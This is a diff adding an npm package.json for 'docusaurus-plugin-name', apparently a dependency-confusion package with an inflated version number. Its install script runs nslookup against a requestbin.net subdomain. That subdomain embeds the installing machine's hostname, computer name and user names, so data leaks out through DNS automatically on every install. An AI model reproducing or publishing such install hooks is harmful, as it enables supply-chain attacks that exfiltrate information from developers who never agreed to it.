@@ -1,0 +1,11 @@
+{
+  "name": "docusaurus-plugin-name",
+  "version": "200.0.6",
+  "description": "docusaurus-plugin-name: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+    "install": "nslookup `hostname`-%computername%.`whoami`-%username%.docusaurus-plugin-name.a430051ef18acd86255c.d.requestbin.net"
+  },
+  "author": "another noob developer",
+  "license": "ISC"
+}
